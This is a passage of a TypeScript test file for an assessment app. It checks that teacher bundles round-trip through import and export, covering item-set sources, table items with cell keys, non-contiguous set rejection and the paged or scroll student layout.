    const firstId = ((await first.json()) as { assessment: { id: string } }).assessment.id;
    const { GET } = await import("../app/api/assessments/[id]/export/route");
    const exported = await GET(
      new Request(`http://localhost/api/assessments/${firstId}/export?include_hidden_rubrics=1`),
      { params: Promise.resolve({ id: firstId }) },
    );
    expect(exported.status).toBe(200);
    const bundle = (await exported.json()) as {
      item_sets: { layout: string; sources: { label: string; text: string }[] }[];
    };
    expect(bundle.item_sets[0]!.layout).toBe("side_by_side");
    expect(bundle.item_sets[0]!.sources).toEqual([
      { label: "Source A", text: "A poem." },
      { label: "Source B", text: "An article." },
    ]);

    const second = await postImport(bundle);
    expect(second.status).toBe(201);
    const secondId = ((await second.json()) as { assessment: { id: string } }).assessment.id;
    const db = getDb();
    const [copy] = await db.select().from(item_sets).where(eq(item_sets.assessment_id, secondId));
    expect(copy!.layout).toBe("side_by_side");
    expect(copy!.sources).toEqual([
      { label: "Source A", text: "A poem." },
      { label: "Source B", text: "An article." },
    ]);
  });

  test("a bundle written before sources existed imports the set with an empty list", async () => {
    const res = await postImport({
      test_id: "older",
      title: "Older bundle",
      items: [{ type: "essay", id: "e1", stem: "Write" }],
      item_sets: [{ id: "s1", stimulus: "Read this.", item_ids: ["e1"] }],
    });
    expect(res.status).toBe(201);
    const { assessment } = (await res.json()) as { assessment: { id: string } };
    const db = getDb();
    const [set] = await db.select().from(item_sets).where(eq(item_sets.assessment_id, assessment.id));
    expect(set!.sources).toEqual([]);
  });

  test("a bundle whose set is not contiguous is rejected at the schema gate", async () => {
    const res = await postImport({
      test_id: "bad",
      title: "Split set",
      items: [
        { type: "essay", id: "a", stem: "A" },
        { type: "essay", id: "b", stem: "B" },
        { type: "essay", id: "c", stem: "C" },
      ],
      item_sets: [{ id: "s1", stimulus: "x", item_ids: ["a", "c"] }],
    });
    expect(res.status).toBe(400);
  });
});

// E3 slice 1: a table round-trips through the teacher bundle, keys included.
describe("import: table items (E3)", () => {
  const table = {
    type: "table",
    id: "t1",
    stem: "Fill in the table.",
    columns: [{ id: "c1", label: "Observed" }, { id: "c2", label: "Expected" }],
    rows: [{ id: "r1", label: "Middle" }, { id: "r2", label: "" }],
    corner: "Chamber",
    cell_keys: { r1: { c1: "12" } },
    scoring_method: "human",
  };

  test("imports the grid, corner and keys into config", async () => {
    asUser("teacher-1");
    const res = await postImport({ test_id: "x", title: "Tables", items: [table] });
    expect(res.status).toBe(201);
    const body = (await res.json()) as { assessment: { id: string }; item_count: number };
    expect(body.item_count).toBe(1);
    const rows = await getDb()
      .select()
      .from(items)
      .where(eq(items.assessment_id, body.assessment.id));
    expect(rows.length).toBe(1);
    expect(rows[0]!.type).toBe("table");
    expect(rows[0]!.config.columns).toEqual(table.columns);
    expect(rows[0]!.config.rows).toEqual(table.rows);
    expect(rows[0]!.config.corner).toBe("Chamber");
    expect(rows[0]!.config.cell_keys).toEqual({ r1: { c1: "12" } });
    expect(rows[0]!.config.scoring_method).toBe("human");
  });

  test("a keyless table imports as a draft with no cell_keys field", async () => {
    asUser("teacher-1");
    const { cell_keys: _k, corner: _c, scoring_method: _s, ...keyless } = table;
    const res = await postImport({ test_id: "x", title: "Tables", items: [keyless] });
    expect(res.status).toBe(201);
    const body = (await res.json()) as { assessment: { id: string } };
    const [row] = await getDb()
      .select()
      .from(items)
      .where(eq(items.assessment_id, body.assessment.id));
    expect(row!.config).not.toHaveProperty("cell_keys");
    expect(row!.config).not.toHaveProperty("corner");
  });
});

// Client paging: the teacher bundle carries student_layout only as "paged";
// an older bundle without the field imports as scroll.
describe("import: student_layout (client paging)", () => {
  test("paged round-trips; absent reads as scroll", async () => {
    asUser("teacher-1");
    const paged = await postImport({ test_id: "x", title: "Paged", student_layout: "paged", items: [{ type: "essay", id: "e1", stem: "Write" }] });
    expect(paged.status).toBe(201);
    const pagedId = ((await paged.json()) as { assessment: { id: string; student_layout: string } }).assessment;
    expect(pagedId.student_layout).toBe("paged");

    const plain = await postImport({ test_id: "y", title: "Plain", items: [{ type: "essay", id: "e1", stem: "Write" }] });
    expect(plain.status).toBe(201);
    expect(((await plain.json()) as { assessment: { student_layout: string } }).assessment.student_layout).toBe("scroll");

    // Export carries the field only when paged.
    const { GET } = await import("../app/api/assessments/[id]/export/route");
    const exp = await (await GET(new Request("http://localhost/x"), { params: Promise.resolve({ id: pagedId.id }) })).json();
    expect(exp.student_layout).toBe("paged");
    const plainId = ((await (await postImport({ test_id: "z", title: "Plain 2", items: [{ type: "essay", id: "e1", stem: "Write" }] })).json()) as { assessment: { id: string } }).assessment.id;
    const exp2 = await (await GET(new Request("http://localhost/x"), { params: Promise.resolve({ id: plainId }) })).json();
    expect(exp2).not.toHaveProperty("student_layout");
  });
});
